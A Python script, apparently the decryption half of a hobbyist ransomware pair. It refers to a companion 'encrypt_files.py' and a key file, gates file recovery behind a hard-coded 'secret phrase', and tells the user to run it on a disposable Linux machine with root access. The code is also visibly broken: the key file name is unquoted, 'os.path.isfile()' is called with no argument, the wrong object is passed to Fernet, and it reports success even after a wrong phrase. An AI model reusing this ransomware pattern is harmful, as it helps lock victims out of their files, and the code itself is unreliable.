""""


Just tryna decrypt some files
DISCLAIMER: You will need to run this code on a Linux operating system that you are willing to not use anymore :)
REQUIREMENTS: Disposable Linux Computer, SSH Root Command, Files
INSTRUCTIONS: Run the code on the command terminal through Python 3 and you should be good


"""
import os
from cryptography.fernet import Fernet #Method used to encrypt file to only access them using a specific key

#Create variables
files = []
secret_phrase = "Hydreigon"

#Gets key to unlock encrypted files
with open(thekey.key, "rb") as key:
    secretkey = key.read()

#Ensure were not appending this file, the key file or the encrypting code file to the list of files we want to decrypt 
for file in os.listdir():
    if file == "encrypt_files.py" or file == "thekey.key" or file == "Decrypt_Files.py":
        continue
    #Goes through every file in the operating system and appends it to the file list
    if os.path.isfile():
        files.append(file)

#Create a password system so if they know the secret phrase only then will they be able to decrypt their files
user_phrase = input("Enter the Secret Phrase to Decrypt your Files: ")

if user_phrase == secret_phrase:
    #Decrypt the files and writes all the information to another file
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(key).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
else:
    print("Decryption Incomplete. Error: Incorrect Secret Phrase")
    
print("Decryption Completed")
